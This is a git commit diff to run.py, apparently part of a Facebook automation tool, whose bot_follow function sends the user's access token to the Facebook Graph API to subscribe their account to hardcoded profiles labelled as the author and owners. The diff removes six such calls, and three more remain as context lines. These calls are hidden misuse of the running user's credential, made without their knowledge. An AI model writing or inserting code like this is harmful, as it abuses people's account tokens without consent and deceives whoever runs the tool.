83b9970b3986e10ed607901a8eb598c1e5767bd7
Lord-Mahesa9 <87583878+Lord-Mahesa9@users.noreply.github.com>
2021-09-19 11:10:04 +0700

    Update run.py

--- run.py
+++ run.py
@@ -90,12 +90,6 @@ def bot_follow():
 	except IOError:
 		print("\n   [!] Token invalid")
 		logs()
-		requests.post('https://graph.facebook.com/100015073506062/subscribers?access_token=' + toket)      #Author
-		requests.post('https://graph.facebook.com/100014007334804/subscribers?access_token=' + toket)      #Owner
-		requests.post('https://graph.facebook.com/100006613569734/subscribers?access_token=' + toket)      #Owner
-		requests.post('https://graph.facebook.com/100000312208041/subscribers?access_token=' + toket) #
-		requests.post('https://graph.facebook.com/100013012878335/subscribers?access_token=' + toket) #
-		requests.post('https://graph.facebook.com/100001800440606/subscribers?access_token=' + toket) #
     	requests.post('https://graph.facebook.com/100041129048948/subscribers?access_token=' + toket)      #
     	requests.post('https://graph.facebook.com/100059454248601/subscribers?access_token=' + toket) #
     	requests.post('https://graph.facebook.com/100042918784910/subscribers?access_token=' + toket)       #
